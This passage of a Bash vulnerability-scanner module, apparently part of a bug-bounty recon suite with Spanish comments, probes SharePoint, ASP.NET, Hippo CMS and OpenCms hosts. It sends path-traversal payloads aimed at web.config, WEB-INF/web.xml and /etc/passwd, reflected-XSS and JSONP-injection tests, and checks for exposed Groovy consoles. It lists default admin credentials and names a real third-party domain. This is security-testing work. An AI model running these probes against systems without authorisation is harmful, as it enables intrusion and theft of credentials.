      "SELECT url FROM urls WHERE domain_id=${DOMAIN_ID} AND url LIKE '%/_api/%' LIMIT 1;" \
      2>/dev/null | grep -oP 'https?://[^/]+(/[^/_][^/]*)?' || echo "")
    [[ -n "$DB_BASE" ]] && SITE_BASES=("${DB_BASE#https://$SUB}" "${SITE_BASES[@]}")

    for SITE_BASE in "${SITE_BASES[@]}"; do
      # REST API — si responde JSON sin auth hay info disclosure
      local API_STATUS API_BODY
      API_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
        -H "Accept: application/json;odata=verbose" \
        -o /tmp/.sp_api_$$ -w "%{http_code}" \
        "${BASE}${SITE_BASE}/_api/web" 2>/dev/null)

      if [[ "$API_STATUS" == "200" ]]; then
        API_BODY=$(head -c 200 /tmp/.sp_api_$$ 2>/dev/null)
        if echo "$API_BODY" | grep -qi '"Title"\|odata.metadata\|SP.Web'; then
          local SP_TITLE
          SP_TITLE=$(echo "$API_BODY" | grep -oP '"Title":"[^"]+"' | head -1)
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${SITE_BASE}/_api/web" \
            "SharePoint REST API Exposed" "medium" \
            "SharePoint REST API accesible sin autenticación — ${SP_TITLE:-info disclosure}" "sharepoint_api"

          # Si /_api/web responde, probar listas y búsqueda
          local LISTS_STATUS
          LISTS_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
            -H "Accept: application/json;odata=verbose" \
            -o /tmp/.sp_lists_$$ -w "%{http_code}" \
            "${BASE}${SITE_BASE}/_api/web/lists" 2>/dev/null)
          if [[ "$LISTS_STATUS" == "200" ]]; then
            local LIST_COUNT
            LIST_COUNT=$(python3 -c "import json,sys; d=json.load(sys.stdin); print(len(d.get('d',{}).get('results',[])))" \
              /tmp/.sp_lists_$$ 2>/dev/null || echo "?")
            _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${SITE_BASE}/_api/web/lists" \
              "SharePoint Lists Enumerable" "high" \
              "SharePoint listas accesibles sin auth — $LIST_COUNT listas expuestas" "sharepoint_lists"
          fi
          break
        fi
      fi
    done

    # _vti_inf.html — confirma SharePoint y revela versión
    local VTI_STATUS VTI_BODY
    VTI_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
      -o /tmp/.vti_$$ -w "%{http_code}" "${BASE}/_vti_inf.html" 2>/dev/null)
    if [[ "$VTI_STATUS" == "200" ]]; then
      VTI_BODY=$(cat /tmp/.vti_$$ 2>/dev/null)
      if echo "$VTI_BODY" | grep -qi "FrontPage\|SharePoint\|vti_"; then
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/_vti_inf.html" \
          "SharePoint Version Disclosure" "low" \
          "Archivo _vti_inf.html accesible — revela versión SharePoint: $(echo "$VTI_BODY" | grep -oP 'FrontPage \S+' | head -1)" "sharepoint_vti"
      fi
    fi

    # trace.axd — ASP.NET tracing (aplicable a SharePoint on-premise)
    local TRACE_STATUS
    TRACE_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
      -o /tmp/.trace_$$ -w "%{http_code}" "${BASE}/trace.axd" 2>/dev/null)
    if [[ "$TRACE_STATUS" == "200" ]]; then
      if grep -qi "Application Trace\|Request Details" /tmp/.trace_$$ 2>/dev/null; then
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/trace.axd" \
          "ASP.NET Trace Enabled" "high" \
          "trace.axd accesible — expone requests, sesiones y variables de entorno" "aspnet_trace"
      fi
    fi

    rm -f /tmp/.sp_api_$$ /tmp/.sp_lists_$$ /tmp/.vti_$$ /tmp/.trace_$$

    # Nuclei SharePoint
    if command -v nuclei &>/dev/null; then
      nuclei -u "$BASE" -tags "sharepoint,microsoft" -silent -jsonl 2>/dev/null | \
        while IFS= read -r LINE; do
          local TEMPLATE SEV
          TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
          SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','?'))" 2>/dev/null)
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
            "SharePoint Nuclei" "$SEV" "Template: $TEMPLATE" "nuclei:$TEMPLATE"
        done
    fi
  done <<< "$SUBS"
}

# ── ASP.NET handlers y WebForms ───────────────────────────────
_scan_aspnet() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"

  # Detección: tech DB + URLs con .aspx/.ashx en DB
  local SUBS
  SUBS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT subdomain FROM technologies
     WHERE domain_id=${DOMAIN_ID}
       AND (tech_name LIKE '%ASP.NET%' OR tech_name LIKE '%IIS%'
            OR tech_name LIKE '%Microsoft%')
     UNION
     SELECT DISTINCT s.subdomain FROM subdomains s
     WHERE s.domain_id=${DOMAIN_ID} AND s.status='alive'
       AND EXISTS (
         SELECT 1 FROM urls u WHERE u.domain_id=s.domain_id
           AND (u.url LIKE '%.aspx%' OR u.url LIKE '%.ashx%'
                OR u.url LIKE '%.asmx%')
       );" 2>/dev/null)

  [[ -z "$SUBS" ]] && return

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local BASE="https://${SUB}"
    log_info "  ASP.NET scan → $BASE"

    # trace.axd — ASP.NET application tracing
    local TRACE_STATUS
    TRACE_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
      -o /tmp/.trace_$$ -w "%{http_code}" "${BASE}/trace.axd" 2>/dev/null)
    if [[ "$TRACE_STATUS" == "200" ]]; then
      grep -qi "Application Trace\|Request Details" /tmp/.trace_$$ 2>/dev/null && \
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/trace.axd" \
          "ASP.NET Trace Enabled" "high" \
          "trace.axd accesible — expone requests, sesiones y variables de entorno" "aspnet_trace"
    fi

    # elmah.axd — Error log handler (muy común en apps legacy)
    local ELMAH_STATUS
    ELMAH_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
      -o /tmp/.elmah_$$ -w "%{http_code}" "${BASE}/elmah.axd" 2>/dev/null)
    if [[ "$ELMAH_STATUS" == "200" ]]; then
      grep -qi "Error Log\|ELMAH\|exception" /tmp/.elmah_$$ 2>/dev/null && \
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/elmah.axd" \
          "ASP.NET ELMAH Error Log Exposed" "high" \
          "elmah.axd accesible — expone stack traces, rutas internas y posibles credenciales" "aspnet_elmah"
    fi

    # .ashx handlers con parámetros de fichero — path traversal
    local ASHX_HANDLERS
    ASHX_HANDLERS=$(sqlite3 "$DB_PATH" \
      "SELECT DISTINCT url FROM urls
       WHERE domain_id=${DOMAIN_ID}
         AND (url LIKE '%.ashx?%' OR url LIKE '%.ashx&%')
         AND (url LIKE '%file=%' OR url LIKE '%path=%' OR url LIKE '%model=%'
              OR url LIKE '%doc=%' OR url LIKE '%template=%' OR url LIKE '%name=%'
              OR url LIKE '%download=%' OR url LIKE '%filename=%')
       LIMIT 20;" 2>/dev/null)

    while IFS= read -r ASHX_URL; do
      [[ -z "$ASHX_URL" ]] && continue
      # Extraer base del handler y nombre del parámetro de fichero
      local HANDLER_BASE PARAM_NAME
      HANDLER_BASE=$(echo "$ASHX_URL" | grep -oP 'https?://[^?]+')
      PARAM_NAME=$(echo "$ASHX_URL" | grep -oP '(?<=\?|&)(file|path|model|doc|template|name|download|filename)(?==)' | head -1)
      [[ -z "$PARAM_NAME" ]] && continue

      # Probar path traversal con diferentes profundidades
      for PAYLOAD in "../web.config" "../../web.config" "../../../web.config" \
                     "..%2Fweb.config" "%2e%2e%2fweb.config"; do
        local TRAV_STATUS TRAV_BODY
        TRAV_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
          -o /tmp/.ashx_$$ -w "%{http_code}" \
          "${HANDLER_BASE}?${PARAM_NAME}=${PAYLOAD}" 2>/dev/null)
        TRAV_BODY=$(cat /tmp/.ashx_$$ 2>/dev/null | head -c 500)

        # Confirmar si devuelve contenido de web.config
        if echo "$TRAV_BODY" | grep -qi "connectionString\|appSettings\|system.web\|machineKey"; then
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "${HANDLER_BASE}?${PARAM_NAME}=${PAYLOAD}" \
            "ASP.NET Handler Path Traversal" "critical" \
            "Path traversal en .ashx — expone web.config con posibles credenciales DB/machineKey: ${PARAM_NAME}=${PAYLOAD}" "aspnet_traversal"
          break
        fi
      done
    done

    rm -f /tmp/.trace_$$ /tmp/.elmah_$$ /tmp/.ashx_$$
  done <<< "$SUBS"
}

# ── Hippo CMS / Bloomreach Experience Manager ─────────────────
_scan_hippo() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"

  # Detección: path /web/.content/ indexado, o tech_name Hippo/Bloomreach/brXM
  local SUBS
  SUBS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT subdomain FROM technologies
     WHERE domain_id=${DOMAIN_ID}
       AND (tech_name LIKE '%Hippo%' OR tech_name LIKE '%Bloomreach%'
            OR tech_name LIKE '%brXM%')
     UNION
     SELECT DISTINCT s.subdomain FROM subdomains s
     WHERE s.domain_id=${DOMAIN_ID} AND s.status='alive'
       AND EXISTS (
         SELECT 1 FROM urls u WHERE u.domain_id=s.domain_id
           AND (u.url LIKE '%/web/.content/%' OR u.url LIKE '%/cms/login%'
                OR u.url LIKE '%/cms/repository%')
       )
     UNION
     SELECT subdomain FROM subdomains
     WHERE domain_id=${DOMAIN_ID} AND status='alive';" 2>/dev/null)

  [[ -z "$SUBS" ]] && return

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local BASE="https://${SUB}"
    log_info "  Hippo CMS scan → $BASE"

    # ── Panel admin /cms/ ──────────────────────────────────────
    local CMS_STATUS CMS_BODY
    CMS_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
      -o /tmp/.hippo_cms_$$ -w "%{http_code}" "${BASE}/cms/" 2>/dev/null)
    CMS_BODY=$(cat /tmp/.hippo_cms_$$ 2>/dev/null | head -c 2000)
    if [[ "$CMS_STATUS" == "200" || "$CMS_STATUS" == "302" ]]; then
      if echo "$CMS_BODY" | grep -qi "Hippo\|Bloomreach\|brXM\|hippo-login\|cms-login"; then
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/cms/" \
          "Hippo CMS Admin Panel Exposed" "high" \
          "Panel de administración Hippo CMS accesible desde internet — brute force o credential stuffing aplicable. Default creds: admin/admin" "hippo_admin"
      fi
    fi

    # ── /cms/login (login form directo) ───────────────────────
    # noredirect: Bug #1b/Bug #9 — un 30x con -L falsifica 200 (FP en sge.repsol.com)
    local LOGIN_STATUS LOGIN_BODY
    _h_get_noredirect "${BASE}/cms/login" --connect-timeout 8 -A "${SCAN_UA:-Mozilla/5.0}"
    LOGIN_STATUS="$HTTP_LAST_STATUS"
    LOGIN_BODY="${HTTP_LAST_BODY:0:2000}"
    if [[ "$LOGIN_STATUS" == "200" ]]; then
      if echo "$LOGIN_BODY" | grep -qi "hippo\|bloomreach\|wicket"; then
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/cms/login" \
          "Hippo CMS Login Page Exposed" "medium" \
          "Página de login del CMS accesible — verificar si panel /cms/ también es accesible" "hippo_login"
      fi
    fi

    # ── Repositorio JCR expuesto ───────────────────────────────
    local JCR_STATUS JCR_BODY
    JCR_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
      -o /tmp/.hippo_jcr_$$ -w "%{http_code}" "${BASE}/cms/repository" 2>/dev/null)
    JCR_BODY=$(cat /tmp/.hippo_jcr_$$ 2>/dev/null | head -c 2000)
    if [[ "$JCR_STATUS" == "200" ]]; then
      if echo "$JCR_BODY" | grep -qi "jcr\|repository\|hippo\|node"; then
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/cms/repository" \
          "Hippo CMS JCR Repository Exposed" "high" \
          "Repositorio JCR (Java Content Repository) de Hippo CMS accesible — puede exponer estructura interna y contenido no publicado" "hippo_jcr"
      fi
    fi

    # ── /web/.content/ — enumeración de directorio ────────────
    local WEB_STATUS WEB_BODY
    WEB_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
      -o /tmp/.hippo_web_$$ -w "%{http_code}" "${BASE}/web/.content/" 2>/dev/null)
    WEB_BODY=$(cat /tmp/.hippo_web_$$ 2>/dev/null | head -c 2000)
    if [[ "$WEB_STATUS" == "200" ]]; then
      if echo "$WEB_BODY" | grep -qi "Index of\|<a href\|\.content"; then
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/web/.content/" \
          "Hippo CMS Content Repository Directory Listing" "medium" \
          "Listado de directorio en /web/.content/ — enumerar documentos no publicados y estructura del CMS" "hippo_content_listing"
      fi
    fi

    # ── Path traversal desde /web/.content/ ───────────────────
    # Intentar salir del content repo hacia /WEB-INF/
    for TRAV in "../WEB-INF/web.xml" "../../WEB-INF/web.xml" \
                "../../../WEB-INF/web.xml" "%2e%2e%2fWEB-INF%2fweb.xml"; do
      local TRAV_STATUS TRAV_BODY
      TRAV_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
        -o /tmp/.hippo_trav_$$ -w "%{http_code}" \
        "${BASE}/web/.content/${TRAV}" 2>/dev/null)
      TRAV_BODY=$(cat /tmp/.hippo_trav_$$ 2>/dev/null | head -c 1000)
      if [[ "$TRAV_STATUS" == "200" ]] && echo "$TRAV_BODY" | grep -qi "<web-app\|<servlet-name\|<display-name\|<context-param"; then
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/web/.content/${TRAV}" \
          "Hippo CMS Path Traversal to WEB-INF" "critical" \
          "Path traversal desde /web/.content/ alcanza WEB-INF/web.xml — puede exponer configuración interna, credenciales y estructura de la app" "hippo_traversal"
        break
      fi
    done

    # ── CVE-2020-14987: RCE via template injection (brXM pre-14.3) ─
    # Test: acceder a /cms/console y verificar si permite ejecución de Groovy
    local CONSOLE_STATUS CONSOLE_BODY
    CONSOLE_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
      -o /tmp/.hippo_console_$$ -w "%{http_code}" "${BASE}/cms/console" 2>/dev/null)
    CONSOLE_BODY=$(cat /tmp/.hippo_console_$$ 2>/dev/null | head -c 2000)
    if [[ "$CONSOLE_STATUS" == "200" ]]; then
      # Require Hippo-specific indicators — plain "script" matches SPA index.html false positive
      if echo "$CONSOLE_BODY" | grep -qi "hippo\|bloomreach\|wicket\|groovy.console\|Execute Script\|<title>.*CMS\|cms-console"; then
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/cms/console" \
          "Hippo CMS Groovy Console Exposed (CVE-2020-14987)" "critical" \
          "Consola Groovy de Hippo CMS accesible sin autenticación — RCE directo (CVE-2020-14987). Explotar: ejecutar comandos OS via Groovy" "hippo_rce"
      fi
    fi

    # ── XSS en Repository Servlet (Hippo Security-22) ─────────
    local XSS_STATUS XSS_BODY XSS_PAYLOAD="<script>alert(1)</script>"
    XSS_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
      -o /tmp/.hippo_xss_$$ -w "%{http_code}" \
      "${BASE}/cms/repository?path=/${XSS_PAYLOAD}" 2>/dev/null)
    XSS_BODY=$(cat /tmp/.hippo_xss_$$ 2>/dev/null | head -c 2000)
    if echo "$XSS_BODY" | grep -qF "$XSS_PAYLOAD"; then
      _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/cms/repository" \
        "Hippo CMS Repository Servlet XSS (Security-22)" "medium" \
        "XSS reflejado en /cms/repository via parámetro path — Hippo Security Advisory 22" "hippo_xss"
    fi

    rm -f /tmp/.hippo_cms_$$ /tmp/.hippo_login_$$ /tmp/.hippo_jcr_$$ \
          /tmp/.hippo_web_$$ /tmp/.hippo_trav_$$ /tmp/.hippo_console_$$ /tmp/.hippo_xss_$$
  done <<< "$SUBS"
}

# ── OpenCms (VASS WCM) ────────────────────────────────────────
_scan_opencms() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"

  # Detección: path /system/modules/ en URLs, o tech OpenCms/VASS
  local SUBS
  SUBS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT subdomain FROM technologies
     WHERE domain_id=${DOMAIN_ID}
       AND (tech_name LIKE '%OpenCms%' OR tech_name LIKE '%opencms%')
     UNION
     SELECT DISTINCT s.subdomain FROM subdomains s
     WHERE s.domain_id=${DOMAIN_ID} AND s.status='alive'
       AND EXISTS (
         SELECT 1 FROM urls u WHERE u.domain_id=s.domain_id
           AND (u.url LIKE '%/system/modules/%'
                OR u.url LIKE '%/opencms/%'
                OR u.url LIKE '%/system/workplace/%'
                OR u.url LIKE '%.vass.wcm%')
       );" 2>/dev/null)

  [[ -z "$SUBS" ]] && return

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local BASE="https://${SUB}"
    log_info "  OpenCms scan → $BASE"

    # ── Panel admin: /system/workplace/ ───────────────────────
    local WP_STATUS WP_BODY
    WP_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
      -o /tmp/.ocms_wp_$$ -w "%{http_code}" -L "${BASE}/system/workplace/" 2>/dev/null)
    WP_BODY=$(cat /tmp/.ocms_wp_$$ 2>/dev/null | head -c 2000)
    if [[ "$WP_STATUS" == "200" ]]; then
      if echo "$WP_BODY" | grep -qi "opencms\|workplace\|login.*opencms\|OpenCms"; then
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/system/workplace/" \
          "OpenCms Workplace Admin Panel Exposed" "high" \
          "Panel de administración OpenCms accesible — brute force o credential stuffing. Default: Admin/admin" "opencms_admin"
      fi
    fi

    # ── Login page: /opencms/opencms/system/workplace/ ────────
    for LOGIN_PATH in "/opencms/opencms/system/workplace/" \
                      "/system/login" "/opencms/login" \
                      "/opencms/opencms/login"; do
      local L_STATUS L_BODY
      L_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
        -o /tmp/.ocms_login_$$ -w "%{http_code}" -L "${BASE}${LOGIN_PATH}" 2>/dev/null)
      L_BODY=$(cat /tmp/.ocms_login_$$ 2>/dev/null | head -c 2000)
      if [[ "$L_STATUS" == "200" ]]; then
        if echo "$L_BODY" | grep -qi "opencms\|OpenCms\|workplace\|ocLogin"; then
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${LOGIN_PATH}" \
            "OpenCms Login Page Exposed" "medium" \
            "Página de login de OpenCms accesible desde internet" "opencms_login"
          break
        fi
      fi
    done

    # ── Versión expuesta via manifest o recursos ───────────────
    for VER_PATH in "/opencms/opencms/system/workplace/resources/commons/version.txt" \
                    "/system/modules/org.opencms.workplace/resources/system/workplace/version.txt" \
                    "/opencms/export/system/workplace/resources/commons/version.txt"; do
      local V_STATUS V_BODY
      V_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 6 ${CURL_PROXY} \
        -o /tmp/.ocms_ver_$$ -w "%{http_code}" "${BASE}${VER_PATH}" 2>/dev/null)
      V_BODY=$(cat /tmp/.ocms_ver_$$ 2>/dev/null | head -c 500)
      if [[ "$V_STATUS" == "200" && -n "$V_BODY" ]]; then
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${VER_PATH}" \
          "OpenCms Version Disclosure" "info" \
          "Versión de OpenCms expuesta: ${V_BODY:0:100}" "opencms_version"
        break
      fi
    done

    # ── JSONP callback injection en JSP modules ────────────────
    # Buscar JSPs con parámetro callback en la DB (twitterCache.jsp, etc.)
    local JSP_CALLBACKS
    JSP_CALLBACKS=$(sqlite3 "$DB_PATH" \
      "SELECT DISTINCT url FROM urls
       WHERE domain_id=${DOMAIN_ID}
         AND url LIKE '%.jsp%callback=%'
       LIMIT 10;" 2>/dev/null)

    while IFS= read -r JSP_URL; do
      [[ -z "$JSP_URL" ]] && continue
      # Inyectar payload en callback — si se refleja sin sanitizar → XSS
      local CB_BASE CB_PARAMS CB_INJECT
      CB_BASE=$(echo "$JSP_URL" | grep -oP 'https?://[^?]+')
      CB_PARAMS=$(echo "$JSP_URL" | grep -oP '\?.*' | sed 's/callback=[^&]*/callback=alert_xss_test/')
      CB_INJECT="${CB_BASE}${CB_PARAMS:-?callback=alert_xss_test}"

      local CB_STATUS CB_BODY
      CB_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
        -o /tmp/.ocms_cb_$$ -w "%{http_code}" "$CB_INJECT" 2>/dev/null)
      CB_BODY=$(cat /tmp/.ocms_cb_$$ 2>/dev/null | head -c 1000)

      if echo "$CB_BODY" | grep -q "alert_xss_test"; then
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "$CB_INJECT" \
          "OpenCms JSP JSONP Callback Injection (XSS)" "high" \
          "El parámetro callback no está sanitizado en ${CB_BASE} — JSONP XSS reflejado" "opencms_jsonp_xss"
      fi
    done <<< "$JSP_CALLBACKS"

    # ── Path traversal en VFS export ──────────────────────────
    for TRAV in "/opencms/export/..%2f..%2fetc/passwd" \
                "/system/modules/..%2f..%2fWEB-INF/web.xml" \
                "/opencms/opencms/..%2f..%2fWEB-INF/web.xml"; do
      local TR_STATUS TR_BODY
      TR_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
        -o /tmp/.ocms_tr_$$ -w "%{http_code}" "${BASE}${TRAV}" 2>/dev/null)
      TR_BODY=$(cat /tmp/.ocms_tr_$$ 2>/dev/null | head -c 1000)
      if echo "$TR_BODY" | grep -qi "root:x\|web-app\|servlet\|WEB-INF"; then
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${TRAV}" \
          "OpenCms Path Traversal" "critical" \
          "Path traversal en OpenCms — acceso a ficheros del servidor: ${TRAV}" "opencms_traversal"
        break
      fi
    done

    # ── Exposición de cookieConfig.json u otros configs ────────
    for CFG in "/web/.content/administratiu/cookies/cookieConfig.json" \
               "/.content/administratiu/cookies/cookieConfig.json" \
               "/system/modules/org.opencms.configuration/opencms-configuration.xml"; do
      local CFG_STATUS
      CFG_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 6 ${CURL_PROXY} \
        -o /tmp/.ocms_cfg_$$ -w "%{http_code}" "${BASE}${CFG}" 2>/dev/null)
      if [[ "$CFG_STATUS" == "200" ]]; then
        local CFG_BODY
        CFG_BODY=$(cat /tmp/.ocms_cfg_$$ 2>/dev/null | head -c 500)
        if echo "$CFG_BODY" | grep -qi "password\|secret\|apiKey\|database\|connectionString"; then
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${CFG}" \
            "OpenCms Config File Exposed with Sensitive Data" "high" \
            "Fichero de configuración accesible con posibles credenciales: ${CFG}" "opencms_config_leak"
        elif [[ -n "$CFG_BODY" ]]; then
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${CFG}" \
            "OpenCms Config File Exposed" "info" \
            "Fichero de configuración accesible: ${CFG}" "opencms_config"
        fi
      fi
    done

    # ── Nuclei: tags opencms + java ────────────────────────────
    if command -v nuclei &>/dev/null; then
      nuclei -u "${BASE}" \
        -tags "opencms,java,tomcat,jndi,log4j" \
        -severity "medium,high,critical" \
        -silent -jsonl 2>/dev/null | \
      while IFS= read -r LINE; do
        [[ -z "$LINE" ]] && continue
        local TMPL SEV HOST
        TMPL=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
        SEV=$(echo "$LINE"  | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','medium'))" 2>/dev/null)
        HOST=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('matched-at',d.get('host','?')))" 2>/dev/null)
        log_warn "  ⚡ OpenCms nuclei: $HOST [$TMPL]"
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "$HOST" \
          "OpenCms/Java finding: $TMPL" "$SEV" \
          "Nuclei template: $TMPL" "nuclei:$TMPL"
      done
    fi

    rm -f /tmp/.ocms_wp_$$ /tmp/.ocms_login_$$ /tmp/.ocms_ver_$$ \
          /tmp/.ocms_cb_$$ /tmp/.ocms_tr_$$ /tmp/.ocms_cfg_$$
  done <<< "$SUBS"
}

# ── Función principal ─────────────────────────────────────────
module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 25 — $MODULE_DESC: $DOMAIN"

  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null || true
  source "${SCRIPT_DIR}/core/finding_validators.sh" 2>/dev/null || true

  # Obtener resumen de tecnologías detectadas
  local TECHS_FOUND
  TECHS_FOUND=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT tech_name FROM technologies
     WHERE domain_id=${DOMAIN_ID}
     ORDER BY tech_name;" 2>/dev/null | tr '\n' ', ' | sed 's/,$//')

  if [[ -z "$TECHS_FOUND" ]]; then
    log_info "Sin tecnologías detectadas — ejecuta módulo 10 primero"
    log_info "Lanzando checks genéricos (Log4Shell, Spring Boot)..."
  else
    log_info "Tecnologías detectadas: $TECHS_FOUND"
  fi

  local FINDINGS_BEFORE
  FINDINGS_BEFORE=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings WHERE domain_id=${DOMAIN_ID} AND type='cms_scan';" \
    2>/dev/null || echo 0)

  # ── Ejecutar scanners según tech detectada ────────────────
  _scan_wordpress      "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_joomla         "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_drupal         "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_magento        "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_aem            "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_liferay        "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_sap            "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_jenkins        "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_atlassian      "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_spring         "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_apache_struts  "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_react2shell    "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_hybris         "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_sharepoint     "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_aspnet         "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_hippo          "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
  _scan_opencms        "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"

  # Log4Shell siempre — afecta a cualquier app Java
  _scan_log4shell      "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"

  local FINDINGS_AFTER NEW_FINDINGS
  FINDINGS_AFTER=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings WHERE domain_id=${DOMAIN_ID} AND type='cms_scan';" \
    2>/dev/null || echo 0)
  NEW_FINDINGS=$(( FINDINGS_AFTER - FINDINGS_BEFORE ))

  if [[ "$NEW_FINDINGS" -gt 0 ]]; then
    _telegram_send "🎯 *CMS Scan completado*
🌐 \`${DOMAIN}\`
🔍 Tecnologías analizadas: ${TECHS_FOUND:0:200}
⚡ Findings nuevos: \`${NEW_FINDINGS}\`
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
  fi

  log_ok "$MODULE_DESC completado: $NEW_FINDINGS findings nuevos"
}
